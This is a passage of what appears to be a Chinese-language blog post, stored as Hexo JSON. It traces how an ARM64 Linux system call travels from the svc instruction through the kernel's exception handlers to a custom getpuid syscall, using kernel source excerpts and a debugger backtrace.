svc 0。</li>\n<li>CPU 进入内核模式，跳转到 el0t_64_sync。</li>\n<li>异常处理函数 el0t_64_sync_handler 被调用。</li>\n<li>进入 el0_svc 和 do_el0_svc 处理 SVC 异常。</li>\n<li>调用 el0_svc_common，它负责查找和调用具体的系统调用处理函数。</li>\n<li>invoke_syscall 调用具体的系统调用处理函数。</li>\n<li>__invoke_syscall 执行具体的系统调用逻辑，例如 __arm64_sys_getpuid。</li>\n</ol>\n<ol>\n<li><p>通过svc触发异常<br>在用户空间程序执行 svc 0 后，会触发一个异常，使得 CPU 从用户模式切换到特权模式（内核模式），并执行相应的异常处理程序。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov x8, #0           // 设置系统调用号到 x8 寄存器</span><br><span class=\"line\">svc 0                // 触发系统调用</span><br></pre></td></tr></table></figure></li>\n<li><p>触发异常后，会调用el0t_64_sync<br>el0代表此刻还在用户态<br>其定义在：<br>arch/arm64/kernel/entry.S</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">entry_handler\t0, t, 64, sync</span><br></pre></td></tr></table></figure>\n<p>enter_handler 是个宏定义，定义如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t.macro entry_handler el:req, ht:req, regsize:req, label:req</span><br><span class=\"line\">SYM_CODE_START_LOCAL(el\\el\\ht\\()_\\regsize\\()_\\label)</span><br><span class=\"line\">\tkernel_entry \\el, \\regsize</span><br><span class=\"line\">\tmov\tx0, sp</span><br><span class=\"line\">\tbl\tel\\el\\ht\\()_\\regsize\\()_\\label\\()_handler</span><br><span class=\"line\">\t.if \\el == 0</span><br><span class=\"line\">\tb\tret_to_user</span><br><span class=\"line\">\t.else</span><br><span class=\"line\">\tb\tret_to_kernel</span><br><span class=\"line\">\t.endif</span><br><span class=\"line\">SYM_CODE_END(el\\el\\ht\\()_\\regsize\\()_\\label)</span><br><span class=\"line\">\t.endm</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>SYM_CODE_START_LOCAL 宏：通常用于定义局部代码符号的开始，确保生成的汇编标签符合特定的格式，</p>\n</li>\n</ol>\n<ul>\n<li><p>el\\el\\ht()_\\regsize()_\\label：</p>\n</li>\n<li><ul>\n<li>el\\el\\ht()_\\regsize()_\\label 这一部分展开成 el0t_64_sync，其中：</li>\n</ul>\n</li>\n<li><ul>\n<li><ul>\n<li>el\\el 是 el0。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><ul>\n<li><ul>\n<li>ht 是 t。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><ul>\n<li><ul>\n<li>regsize() 是 64_。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><ul>\n<li><ul>\n<li>label 是 sync。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><ul>\n<li>最终生成的符号名是 el0t_64_sync。</li>\n</ul>\n</li>\n<li><p>()_：</p>\n</li>\n<li><ul>\n<li><ul>\n<li>( )_ 表示在宏参数后插入一个下划线 _，以便将参数值与下一个部分连接起来。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><ul>\n<li><ul>\n<li>例如，\\regsize() 是 64_，即寄存器大小后跟一个下划线。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>kernel_entry 宏，它通常用于设置进入内核时的上下文环境。这包括禁用中断、保存上下文和切换到内核模式等操作。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.macro\tkernel_entry, el, regsize = 64</span><br><span class=\"line\">.if\t\\el == 0</span><br><span class=\"line\">alternative_insn nop, SET_PSTATE_DIT(1), ARM64_HAS_DIT</span><br><span class=\"line\">.endif</span><br><span class=\"line\">.if\t\\regsize == 32</span><br><span class=\"line\">mov\tw0, w0\t\t\t\t// zero upper 32 bits of x0</span><br><span class=\"line\">.endif</span><br><span class=\"line\">stp\tx0, x1, [sp, #16 * 0]</span><br><span class=\"line\">stp\tx2, x3, [sp, #16 * 1]</span><br><span class=\"line\">stp\tx4, x5, [sp, #16 * 2]</span><br><span class=\"line\">stp\tx6, x7, [sp, #16 * 3]</span><br><span class=\"line\">stp\tx8, x9, [sp, #16 * 4]</span><br><span class=\"line\">stp\tx10, x11, [sp, #16 * 5]</span><br><span class=\"line\">stp\tx12, x13, [sp, #16 * 6]</span><br><span class=\"line\">stp\tx14, x15, [sp, #16 * 7]</span><br><span class=\"line\">stp\tx16, x17, [sp, #16 * 8]</span><br><span class=\"line\">stp\tx18, x19, [sp, #16 * 9]</span><br><span class=\"line\">stp\tx20, x21, [sp, #16 * 10]</span><br><span class=\"line\">stp\tx22, x23, [sp, #16 * 11]</span><br><span class=\"line\">stp\tx24, x25, [sp, #16 * 12]</span><br><span class=\"line\">stp\tx26, x27, [sp, #16 * 13]</span><br><span class=\"line\">stp\tx28, x29, [sp, #16 * 14]</span><br><span class=\"line\"></span><br><span class=\"line\">   ...</span><br><span class=\"line\">   .endm</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>调用 el0t_64_sync_handler<br>主要处理从 EL0（用户态）到 EL1（内核态）的64位同步异常</li>\n</ol>\n<p>函数定义和初始化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">asmlinkage void noinstr el0t_64_sync_handler(struct pt_regs *regs)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tunsigned long esr = read_sysreg(esr_el1);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>asmlinkage：这是一个宏，通常用于指定函数的调用约定，确保参数通过堆栈传递而不是通过寄存器传递。这对于内核和用户态之间的调用非常重要。<br>noinstr：这是一种属性，指示编译器不要在这个函数中插入调试或分析相关的指令。<br>el0t_64_sync_handler：函数名，处理 EL0 到 EL1 的64位同步异常。<br>struct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。<br>unsigned long esr = read_sysreg(esr_el1)：读取异常综合寄存器（ESR），这个寄存器包含了异常的详细信息。<br>ESR_ELx_EC_SVC64：处理系统调用异常</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">switch (ESR_ELx_EC(esr)) &#123;</span><br><span class=\"line\">\tcase ESR_ELx_EC_SVC64:</span><br><span class=\"line\">\t\tel0_svc(regs);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>el0_svc<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static void noinstr el0_svc(struct pt_regs *regs)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tenter_from_user_mode(regs);</span><br><span class=\"line\">\tcortex_a76_erratum_1463225_svc_handler();</span><br><span class=\"line\">\tfp_user_discard();</span><br><span class=\"line\">\tlocal_daif_restore(DAIF_PROCCTX);</span><br><span class=\"line\">\tdo_el0_svc(regs);</span><br><span class=\"line\">\texit_to_user_mode(regs);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n这段代码定义了一个静态函数 el0_svc，用于处理从用户态（EL0）到内核态（EL1）的系统调用（SVC，Supervisor Call）异常。让我们按照之前解释的规则对这段代码进行详细解析。</li>\n</ol>\n<p>函数定义</p>\n<p>static void noinstr el0_svc(struct pt_regs *regs)<br>static：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。<br>noinstr：这个属性指示编译器不要在这个函数中插入调试或分析相关的指令。<br>void：表示函数不返回任何值。<br>el0_svc：函数名，处理从EL0到EL1的系统调用异常。<br>struct pt_regs *regs：一个指向保存异常发生时CPU寄存器状态的结构体的指针。<br>函数实现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\tenter_from_user_mode(regs);</span><br><span class=\"line\">\tcortex_a76_erratum_1463225_svc_handler();</span><br><span class=\"line\">\tfp_user_discard();</span><br><span class=\"line\">\tlocal_daif_restore(DAIF_PROCCTX);</span><br><span class=\"line\">\tdo_el0_svc(regs);</span><br><span class=\"line\">\texit_to_user_mode(regs);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>enter_from_user_mode(regs)</li>\n</ol>\n<p>enter_from_user_mode(regs);<br>这个函数将上下文从用户模式切换到内核模式。它通常包括保存用户态寄存器、设置内核态堆栈等操作。<br>2. cortex_a76_erratum_1463225_svc_handler()</p>\n<p>cortex_a76_erratum_1463225_svc_handler();<br>这是一个特定于 Cortex-A76 处理器的错误处理程序。这个函数处理 Cortex-A76 处理器中的特定硬件错误（erratum 1463225）。<br>3. fp_user_discard()</p>\n<p>fp_user_discard();<br>这个函数用于丢弃用户态的浮点上下文，以确保在内核态不会使用用户态的浮点寄存器。这通常是为了安全性和上下文切换的正确性。<br>4. local_daif_restore(DAIF_PROCCTX)</p>\n<p>local_daif_restore(DAIF_PROCCTX);<br>这个函数用于恢复中断状态。DAIF_PROCCTX 是一个标志，用于指示当前的处理器上下文。这个函数通常会重新使能中断或其他处理器状态。<br>5. do_el0_svc(regs)</p>\n<p>do_el0_svc(regs);<br>这个函数处理实际的系统调用逻辑。regs 包含了系统调用号和参数，通过这个函数调用具体的系统调用处理函数。<br>6. exit_to_user_mode(regs)</p>\n<p>exit_to_user_mode(regs);<br>这个函数将上下文从内核模式切换回用户模式。它通常包括恢复用户态寄存器、设置用户态堆栈等操作。</p>\n<p>总结<br>el0_svc 函数处理从用户态到内核态的系统调用异常。具体步骤如下：</p>\n<ul>\n<li>进入内核模式：通过 enter_from_user_mode 保存用户态上下文并切换到内核模式。</li>\n<li>处理特定处理器错误：通过 cortex_a76_erratum_1463225_svc_handler 处理 Cortex-A76 处理器的特定错误。</li>\n<li>丢弃用户态浮点上下文：通过 fp_user_discard 确保内核态不会使用用户态浮点寄存器。</li>\n<li>恢复中断状态：通过 local_daif_restore 恢复处理器的中断状态。</li>\n<li>处理系统调用：通过 do_el0_svc 调用具体的系统调用处理函数。<br>返回用户模式：通过 exit_to_user_mode 恢复用户态上下文并返回用户模式。</li>\n</ul>\n<ol start=\"5\">\n<li><p>do_el0_svc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void do_el0_svc(struct pt_regs *regs)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tel0_svc_common(regs, regs-&gt;regs[8], __NR_syscalls, sys_call_table);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n<li><p>el0_sev_common</p>\n</li>\n</ol>\n<p>函数定义</p>\n<p>static void el0_svc_common(struct pt_regs *regs, int scno, int sc_nr,<br>                           const syscall_fn_t syscall_table[])<br>static：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。<br>void：表示函数不返回任何值。<br>el0_svc_common：函数名，处理从 EL0（用户态）到 EL1（内核态）的系统调用。<br>struct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。<br>int scno：系统调用号。<br>int sc_nr：系统调用的总数量。<br>const syscall_fn_t syscall_table[]：系统调用表，包含所有系统调用的函数指针。<br>函数实现<br>初始化和上下文保存</p>\n<p>unsigned long flags = read_thread_flags();</p>\n<p>regs-&gt;orig_x0 = regs-&gt;regs[0];<br>regs-&gt;syscallno = scno;<br>read_thread_flags()：读取当前线程的标志。<br>regs-&gt;orig_x0 = regs-&gt;regs[0]：保存原始的 x0 寄存器值。<br>regs-&gt;syscallno = scno：保存系统调用号。<br>注释部分：BTI 处理说明</p>\n<p>/*</p>\n<ul>\n<li>BTI note:</li>\n<li>The architecture does not guarantee that SPSR.BTYPE is zero</li>\n<li>on taking an SVC, so we could return to userspace with a</li>\n<li>non-zero BTYPE after the syscall.</li>\n<li></li>\n<li>This shouldn’t matter except when userspace is explicitly</li>\n<li>doing something stupid, such as setting PROT_BTI on a page</li>\n<li>that lacks conforming BTI/PACIxSP instructions, falling</li>\n<li>through from one executable page to another with differing</li>\n<li>PROT_BTI, or messing with BTYPE via ptrace: in such cases,</li>\n<li>userspace should not be surprised if a SIGILL occurs on</li>\n<li>syscall return.</li>\n<li></li>\n<li>So, don’t touch regs-&gt;pstate &amp; PSR_BTYPE_MASK here.</li>\n<li>(Similarly for HVC and SMC elsewhere.)</li>\n<li>/<br>这段注释解释了 BTI（Branch Target Identification）的处理和可能出现的问题。主要说明不要修改 regs-&gt;pstate 中的 PSR_BTYPE_MASK 位。<br>处理异步标记检查故障</li>\n</ul>\n<p>if (flags &amp; _TIF_MTE_ASYNC_FAULT) {<br>    syscall_set_return_value(current, regs, -ERESTARTNOINTR, 0);<br>    return;<br>}<br>检查 _TIF_MTE_ASYNC_FAULT 标志，如果设置了这个标志，表示有异步的标记检查故障需要处理。<br>syscall_set_return_value(current, regs, -ERESTARTNOINTR, 0)：设置系统调用返回值为 -ERESTARTNOINTR，表示系统调用需要重启。<br>return：返回，不继续执行后续的系统调用处理。<br>处理系统调用的额外工作</p>\n<p>if (has_syscall_work(flags)) {<br>    if (scno == NO_SYSCALL)<br>        syscall_set_return_value(current, regs, -ENOSYS, 0);<br>    scno = syscall_trace_enter(regs);<br>    if (scno == NO_SYSCALL)<br>        goto trace_exit;<br>}<br>has_syscall_work(flags)：检查是否有系统调用需要处理的额外工作，例如 ptrace 相关的操作。<br>如果系统调用号为 NO_SYSCALL，设置返回值为 -ENOSYS（系统调用不存在）。<br>syscall_trace_enter(regs)：处理系统调用进入的跟踪逻辑，并返回可能修改过的系统调用号。<br>如果系统调用号仍然是 NO_SYSCALL，跳转到 trace_exit 标签，进行系统调用退出的跟踪逻辑。<br>调用具体的系统调用</p>\n<p>invoke_syscall(regs, scno, sc_nr, syscall_table);<br>invoke_syscall(regs, scno, sc_nr, syscall_table)：调用系统调用表中的具体系统调用函数。<br>检查和处理系统调用退出的跟踪逻辑</p>\n<p>if (!has_syscall_work(flags) &amp;&amp; !IS_ENABLED(CONFIG_DEBUG_RSEQ)) {<br>    flags = read_thread_flags();<br>    if (!has_syscall_work(flags) &amp;&amp; !(flags &amp; _TIF_SINGLESTEP))<br>        return;<br>}</p>\n<p>trace_exit:<br>syscall_trace_exit(regs);<br>再次检查是否有系统调用需要处理的额外工作以及是否启用了 RSEQ（重启动序列）调试。<br>如果没有额外工作需要处理，并且没有启用单步调试，则直接返回。<br>如果有工作需要处理，或者启用了单步调试，调用 syscall_trace_exit(regs) 进行系统调用退出的跟踪逻辑。<br>总结<br>el0_svc_common 函数处理系统调用的主要逻辑，包括：</p>\n<p>保存上下文：保存原始寄存器值和系统调用号。<br>处理异步标记检查故障：在系统调用实际执行前，处理异步标记检查故障。<br>处理系统调用的额外工作：包括 ptrace 相关的操作。<br>调用具体的系统调用：根据系统调用号，从系统调用表中调用具体的系统调用函数。<br>处理系统调用退出的跟踪逻辑：包括检查系统调用退出时是否需要进行额外的处理。<br>通过这些步骤，确保系统调用的执行是安全且符合预期的，同时处理了系统调用前后的各种特殊情况。</p>\n<p>6.invoke_syscall()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static void invoke_syscall(struct pt_regs *regs, unsigned int scno,</span><br><span class=\"line\">\t\t\t   unsigned int sc_nr,</span><br><span class=\"line\">\t\t\t   const syscall_fn_t syscall_table[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tlong ret;</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd_random_kstack_offset();</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (scno &lt; sc_nr) &#123;</span><br><span class=\"line\">\t\tsyscall_fn_t syscall_fn;</span><br><span class=\"line\">\t\tsyscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];</span><br><span class=\"line\">\t\tret = __invoke_syscall(regs, syscall_fn);</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\tret = do_ni_syscall(regs, scno);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsyscall_set_return_value(current, regs, 0, ret);</span><br><span class=\"line\"></span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * Ultimately, this value will get limited by KSTACK_OFFSET_MAX(),</span><br><span class=\"line\">\t * but not enough for arm64 stack utilization comfort. To keep</span><br><span class=\"line\">\t * reasonable stack head room, reduce the maximum offset to 9 bits.</span><br><span class=\"line\">\t *</span><br><span class=\"line\">\t * The actual entropy will be further reduced by the compiler when</span><br><span class=\"line\">\t * applying stack alignment constraints: the AAPCS mandates a</span><br><span class=\"line\">\t * 16-byte (i.e. 4-bit) aligned SP at function boundaries.</span><br><span class=\"line\">\t *</span><br><span class=\"line\">\t * The resulting 5 bits of entropy is seen in SP[8:4].</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tchoose_random_kstack_offset(get_random_u16() &amp; 0x1FF);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>让我们按照之前的规则对 invoke_syscall 函数进行详细解析。这段代码用于调用系统调用处理函数，根据系统调用号选择合适的系统调用处理程序，并设置返回值。</p>\n<p>函数定义</p>\n<p>static void invoke_syscall(struct pt_regs *regs, unsigned int scno,<br>               unsigned int sc_nr,<br>               const syscall_fn_t syscall_table[])<br>static：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。<br>void：表示函数不返回任何值。<br>invoke_syscall：函数名，处理系统调用的实际执行。<br>struct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。<br>unsigned int scno：系统调用号。<br>unsigned int sc_nr：系统调用的总数量。<br>const syscall_fn_t syscall_table[]：系统调用表，包含所有系统调用的函数指针。<br>函数实现<br>添加随机堆栈偏移</p>\n<p>add_random_kstack_offset();<br>add_random_kstack_offset()：这个函数用于添加一个随机的内核堆栈偏移，增加堆栈布局的随机性以提高安全性。<br>调用具体的系统调用</p>\n<p>if (scno &lt; sc_nr) {<br>    syscall_fn_t syscall_fn;<br>    syscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];<br>    ret = __invoke_syscall(regs, syscall_fn);<br>} else {<br>    ret = do_ni_syscall(regs, scno);<br>}<br>if (scno &lt; sc_nr)：检查系统调用号是否在有效范围内（即是否小于总的系统调用数量）。<br>有效系统调用：<br>syscall_fn_t syscall_fn;：声明一个系统调用函数指针。<br>syscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];：从系统调用表中获取对应的系统调用函数，使用 array_index_nospec 来防止投机执行漏洞。<br>ret = __invoke_syscall(regs, syscall_fn);：调用具体的系统调用处理函数，并将返回值保存到 ret 中。<br>无效系统调用：<br>ret = do_ni_syscall(regs, scno);：调用未实现的系统调用处理函数 do_ni_syscall，并将返回值保存到 ret 中。<br>设置系统调用返回值</p>\n<p>syscall_set_return_value(current, regs, 0, ret);<br>syscall_set_return_value(current, regs, 0, ret)：设置系统调用的返回值。<br>current：当前进程的任务结构指针。<br>regs：保存寄存器状态的结构指针。<br>0：系统调用成功的标志（通常为 0）。<br>ret：系统调用的返回值。<br>选择新的随机堆栈偏移</p>\n<p>/*</p>\n<ul>\n<li>Ultimately, this value will get limited by KSTACK_OFFSET_MAX(),</li>\n<li>but not enough for arm64 stack utilization comfort. To keep</li>\n<li>reasonable stack head room, reduce the maximum offset to 9 bits.</li>\n<li></li>\n<li>The actual entropy will be further reduced by the compiler when</li>\n<li>applying stack alignment constraints: the AAPCS mandates a</li>\n<li>16-byte (i.e. 4-bit) aligned SP at function boundaries.</li>\n<li></li>\n<li>The resulting 5 bits of entropy is seen in SP[8:4].</li>\n<li>/<br>choose_random_kstack_offset(get_random_u16() &amp; 0x1FF);<br>注释部分解释了为什么要限制堆栈偏移值，并确保其合理性和安全性。<br>choose_random_kstack_offset(get_random_u16() &amp; 0x1FF)：选择一个新的随机堆栈偏移值。<br>get_random_u16() &amp; 0x1FF：生成一个 16 位的随机数，并将其与 0x1FF 进行与操作，限制偏移值在 9 位以内。<br>总结<br>invoke_syscall 函数主要负责调用系统调用处理函数，具体步骤如下：</li>\n</ul>\n<p>添加随机堆栈偏移：通过 add_random_kstack_offset() 增加堆栈布局的随机性。<br>检查系统调用号的有效性：如果系统调用号在有效范围内，从系统调用表中获取对应的处理函数并调用它；否则调用未实现的系统调用处理函数。<br>设置系统调用返回值：通过 syscall_set_return_value(current, regs, 0, ret) 设置系统调用的返回值。<br>选择新的随机堆栈偏移：通过 choose_random_kstack_offset(get_random_u16() &amp; 0x1FF) 选择一个新的随机堆栈偏移值。<br>通过这些步骤，invoke_syscall 确保系统调用的执行过程是安全的，并增加了堆栈布局的随机性以提高安全性。</p>\n<ol start=\"7\">\n<li>static long __invoke_syscall(struct pt_regs *regs, syscall_fn_t syscall_fn)<br>{<br> return syscall_fn(regs);<br>}<br>这里便开始执行真正的系统调用函数。</li>\n</ol>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>系统调用解析</p>\n<p>trace:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">───────────────────────────────────────────────────────────── code:arm64: ────</span><br><span class=\"line\">   0xffff800080023758 &lt;__arm64_sys_ni_syscall+0010&gt; ldp    x29,  x30,  [sp],  #16</span><br><span class=\"line\">   0xffff80008002375c &lt;__arm64_sys_ni_syscall+0014&gt; autiasp </span><br><span class=\"line\">   0xffff800080023760 &lt;__arm64_sys_ni_syscall+0018&gt; ret    </span><br><span class=\"line\">●→ 0xffff800080023764 &lt;__arm64_sys_getpuid+0000&gt; paciasp </span><br><span class=\"line\">   0xffff800080023768 &lt;__arm64_sys_getpuid+0004&gt; stp    x29,  x30,  [sp,  #-208]!</span><br><span class=\"line\">   0xffff80008002376c &lt;__arm64_sys_getpuid+0008&gt; mov    x4,  #0x800000000000        \t// #140737488355328</span><br><span class=\"line\">   0xffff800080023770 &lt;__arm64_sys_getpuid+000c&gt; mov    x29,  sp</span><br><span class=\"line\">   0xffff800080023774 &lt;__arm64_sys_getpuid+0010&gt; stp    x19,  x20,  [sp,  #16]</span><br><span class=\"line\">   0xffff800080023778 &lt;__arm64_sys_getpuid+0014&gt; add    x19,  sp,  #0x50</span><br><span class=\"line\">──────────────────────────────────── source:../arch/arm64/kernel/sys.c+39 ────</span><br><span class=\"line\">     34\t \t\t!system_supports_32bit_el0())</span><br><span class=\"line\">     35\t \t\treturn -EINVAL;</span><br><span class=\"line\">     36\t \treturn ksys_personality(personality);</span><br><span class=\"line\">     37\t &#125;</span><br><span class=\"line\">     38\t </span><br><span class=\"line\"> →   39\t SYSCALL_DEFINE2(getpuid,pid_t __user *, pid,uid_t __user *,uid)&#123;</span><br><span class=\"line\">     40\t \tpid_t kpid;</span><br><span class=\"line\">     41\t \tuid_t kuid;</span><br><span class=\"line\">     42\t \tprintk(&quot;%s add syscall call&quot;,__func__);</span><br><span class=\"line\">     43\t \tif(pid == NULL &amp;&amp; uid == NULL)&#123;</span><br><span class=\"line\">     44\t \t\treturn -EINVAL;</span><br><span class=\"line\">───────────────────────────────────────────────────────────────── threads ────</span><br><span class=\"line\">[#0] Id 1, stopped 0xffff800081854eb8 in cpu_do_idle (), reason: BREAKPOINT</span><br><span class=\"line\">[#1] Id 2, stopped 0xffff800080023764 in __arm64_sys_getpuid (), reason: BREAKPOINT</span><br><span class=\"line\">─────────────────────────────────────────────────────────────────── trace ────</span><br><span class=\"line\">[#0] 0xffff800080023764 → __arm64_sys_getpuid(regs=0xffff800086877eb0)</span><br><span class=\"line\">[#1] 0xffff80008002dabc → __invoke_syscall(syscall_fn=&lt;optimized out&gt;, regs=0xffff800086877eb0)</span><br><span class=\"line\">[#2] 0xffff80008002dabc → invoke_syscall(regs=0xffff800086877eb0, scno=0x1c9, sc_nr=0x1ca, syscall_table=0xffff8000818966c0 &lt;sys_call_table&gt;)</span><br><span class=\"line\">[#3] 0xffff80008002dc58 → el0_svc_common(regs=0xffff800086877eb0, scno=0x1c9, sc_nr=0x1ca, syscall_table=0xffff8000818966c0 &lt;sys_call_table&gt;)</span><br><span class=\"line\">[#4] 0xffff80008002dd68 → do_el0_svc(regs=0xffff800086877eb0)</span><br><span class=\"line\">[#5] 0xffff8000818536d4 → el0_svc(regs=0xffff800086877eb0)</span><br><span class=\"line\">[#6] 0xffff800081853a70 → el0t_64_sync_handler(regs=&lt;optimized out&gt;)</span><br><span class=\"line\">[#7] 0xffff800080011d4c → el0t_64_sync()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ol>\n<li>用户空间调用 syscall，触发 svc 0。</li>\n<li>CPU 进入内核模式，跳转到 el0t_64_sync。</li>\n<li>异常处理函数 el0t_64_sync_handler 被调用。</li>\n<li>进入 el0_svc 和 do_el0_svc 处理 SVC 异常。</li>\n<li>调用 el0_svc_common，它负责查找和调用具体的系统调用处理函数。</li>\n<li>invoke_syscall 调用具体的系统调用处理函数。</li>\n<li>__invoke_syscall 执行具体的系统调用逻辑，例如 __arm64_sys_getpuid。</li>\n</ol>\n<ol>\n<li><p>通过svc触发异常<br>在用户空间程序执行 svc 0 后，会触发一个异常，使得 CPU 从用户模式切换到特权模式（内核模式），并执行相应的异常处理程序。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov x8, #0           // 设置系统调用号到 x8 寄存器</span><br><span class=\"line\">svc 0                // 